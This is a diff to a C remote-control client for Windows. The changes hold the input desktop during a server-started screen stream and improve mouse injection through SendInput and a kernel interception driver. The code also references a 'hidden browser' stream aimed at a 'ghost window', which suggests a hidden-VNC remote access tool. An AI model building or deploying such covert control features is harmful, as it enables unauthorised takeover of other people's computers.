@@ -471,6 +471,7 @@ static void remote_get_os_full_name(char* out_os, size_t out_os_sz) {
 
 /* Switch current thread to the desktop that receives user input (required for mouse/keyboard injection to work). */
 static input_desktop_scope_t switch_to_input_desktop(void) {
+    remote_log("[loop] switch_to_input_desktop");
     input_desktop_scope_t s = { NULL, NULL };
     HDESK hInput = OpenInputDesktop(0, FALSE, DESKTOP_JOURNALPLAYBACK | DESKTOP_READOBJECTS | DESKTOP_WRITEOBJECTS);
     if (!hInput) {
@@ -488,10 +489,31 @@ static void restore_input_desktop(input_desktop_scope_t* s) {
     if (s->to_close) CloseDesktop(s->to_close);
 }
 
-static volatile long g_client_stop = 0;
-static volatile long g_request_reconnect = 0;
 /* 0=User (SendInput/mouse_event/keybd_event), 1=Kernel (interception driver). Set by DoSetRemoteControlMode. */
 static volatile int g_remote_control_mode = 0;
+
+/* User/SendInput: switch thread to input desktop once when remote desktop stream starts (GetDesktop CreateNew),
+   restore when server sends DoStopRemoteDesktop (Stop button). */
+static input_desktop_scope_t g_rd_user_sendinput_desktop = { NULL, NULL };
+static volatile int g_rd_user_sendinput_desktop_holding = 0;
+
+static void rd_user_acquire_input_desktop_for_remote_desktop_start(void) {
+    if (g_rd_user_sendinput_desktop_holding) return;
+    if (g_remote_control_mode != 0) return;
+    g_rd_user_sendinput_desktop = switch_to_input_desktop();
+    if (g_rd_user_sendinput_desktop.to_close)
+        g_rd_user_sendinput_desktop_holding = 1;
+}
+
+static void rd_user_release_input_desktop_after_remote_desktop_stop(void) {
+    if (!g_rd_user_sendinput_desktop_holding) return;
+    restore_input_desktop(&g_rd_user_sendinput_desktop);
+    memset(&g_rd_user_sendinput_desktop, 0, sizeof(g_rd_user_sendinput_desktop));
+    g_rd_user_sendinput_desktop_holding = 0;
+}
+
+static volatile long g_client_stop = 0;
+static volatile long g_request_reconnect = 0;
 /* 1 when hidden browser stream is active; mouse/keyboard events target ghost window. */
 static volatile int g_hidden_browser_streaming = 0;
 /* Throttle input-path log for mouse move to avoid spam. */
@@ -1087,10 +1109,11 @@ void remote_client_run(void) {
                     unsigned int consumed = 0;
                     unsigned int subtype = remote_proto_read_subtype(dispatch_buf, dispatch_len, &consumed);
                     unsigned int body_len = (dispatch_len > consumed) ? (dispatch_len - consumed) : 0;
-                    remote_log("[loop] received subtype=%u body_len=%u", subtype, body_len);
+                    /* Verbose decode logging disabled (simpler dbgview output). */
+                    /* remote_log("[loop] received subtype=%u body_len=%u", subtype, body_len); */
                     if (body_len > 0) {
                         unsigned int dump_len = body_len > 64 ? 64 : body_len;
-                        remote_log_hex("IMessage body", dispatch_buf + consumed, dump_len);
+                        /* remote_log_hex("IMessage body", dispatch_buf + consumed, dump_len); */
                     }
 
                     if (subtype == REMOTE_SUBTYPE_GetMonitors) {
@@ -1238,6 +1261,9 @@ void remote_client_run(void) {
                             remote_log_hex("DoSetRemoteControlMode body", (const unsigned char*)(dispatch_buf + consumed), dispatch_len - consumed);
                         }
                     }
+                    else if (subtype == REMOTE_SUBTYPE_DoStopRemoteDesktop) {
+                        rd_user_release_input_desktop_after_remote_desktop_stop();
+                    }
                     else if (subtype == REMOTE_SUBTYPE_DoMouseEvent) {
                         remote_log("[loop] handling DoMouseEvent (body_len=%u)", (unsigned)(dispatch_len - consumed));
                         remote_log_hex("DoMouseEvent body", (const unsigned char*)(dispatch_buf + consumed), dispatch_len - consumed);
@@ -1292,40 +1318,52 @@ void remote_client_run(void) {
                                 }
                             }
                             if (effective_mode == 1 && remote_input_interception_is_ready()) {
-                                /* Ensure injection targets the thread's input desktop. */
-                                input_desktop_scope_t scope = switch_to_input_desktop();
                                 /* Keep the OS cursor position in sync so focus changes normally. */
                                 (void)SetCursorPos(px, py);
-                                if (act == 4)
+                                if (act == 4) {
                                     remote_input_interception_mouse_move(px, py);
+                                }
                                 else {
                                     remote_input_interception_mouse_move(px, py);
-                                    if (act == 0 || act == 1) remote_input_interception_mouse_button(0, is_down);
-                                    else if (act == 2 || act == 3) remote_input_interception_mouse_button(1, is_down);
-                                    else if (act == 5) remote_input_interception_mouse_wheel(120);
-                                    else if (act == 6) remote_input_interception_mouse_wheel(-120);
+                                    if (act == 0 || act == 1) {
+                                        int ok = remote_input_interception_mouse_button(0, is_down);
+                                        if (ok == 0) {
+                                            remote_log("[kernel] interception click failed (sent=0); no fallback act=%u is_down=%d", act, is_down);
+                                        }
+                                    }
+                                    else if (act == 2 || act == 3) {
+                                        int ok = remote_input_interception_mouse_button(1, is_down);
+                                        if (ok == 0) {
+                                            remote_log("[kernel] interception click failed (sent=0); no fallback act=%u is_down=%d", act, is_down);
+                                        }
+                                    }
+                                    else if (act == 5) {
+                                        int ok = remote_input_interception_mouse_wheel(120);
+                                        if (ok == 0) {
+                                            remote_log("[kernel] interception wheel failed (sent=0); no fallback act=%u", act);
+                                        }
+                                    }
+                                    else if (act == 6) {
+                                        int ok = remote_input_interception_mouse_wheel(-120);
+                                        if (ok == 0) {
+                                            remote_log("[kernel] interception wheel failed (sent=0); no fallback act=%u", act);
+                                        }
+                                    }
                                 }
-                                if (scope.to_close) restore_input_desktop(&scope);
                             } else {
-                                /* Match the reference C# client:
-                                   - do not switch thread desktop in User/SendInput mode
-                                   - SetCursorPos primarily for MoveCursor
-                                   - clicks/wheel via SendInput */
+                                /* User / SendInput mode — thread should already be on input desktop (acquired on GetDesktop CreateNew). */
                                 if (act == 4) {
-                                    /* MoveCursor (C# uses SetCursorPos for mouse move). */
                                     SetCursorPos(px, py);
+                                } else if (act == 5 || act == 6) {
+                                    /* Scroll: do NOT call SetCursorPos — the server sends (0,0) for scroll coords. */
+                                    remote_send_mouse_sendinput(MOUSEEVENTF_WHEEL,
+                                        act == 5 ? (DWORD)120 : (DWORD)-120);
                                 } else {
-                                    /* Ensure cursor is positioned before any click/scroll so focus updates immediately. */
                                     SetCursorPos(px, py);
-
                                     if (act == 0 || act == 1) {
                                         remote_send_mouse_sendinput(is_down ? MOUSEEVENTF_LEFTDOWN : MOUSEEVENTF_LEFTUP, 0);
                                     } else if (act == 2 || act == 3) {
                                         remote_send_mouse_sendinput(is_down ? MOUSEEVENTF_RIGHTDOWN : MOUSEEVENTF_RIGHTUP, 0);
-                                    } else if (act == 5) {
-                                        remote_send_mouse_sendinput(MOUSEEVENTF_WHEEL, 120);
-                                    } else if (act == 6) {
-                                        remote_send_mouse_sendinput(MOUSEEVENTF_WHEEL, (DWORD)-120);
                                     }
                                 }
                             }
@@ -1854,6 +1892,8 @@ void remote_client_run(void) {
                                     remote_desktop_reset();
                                 prev_quality = quality;
                                 prev_display = display_index;
+                                if (create_new)
+                                    rd_user_acquire_input_desktop_for_remote_desktop_start();
                                 unsigned int img_len = 0;
                                 int w = 0, h = 0;
                                 unsigned char* img_buf = remote_desktop_capture(display_index, quality, &img_len, &w, &h);
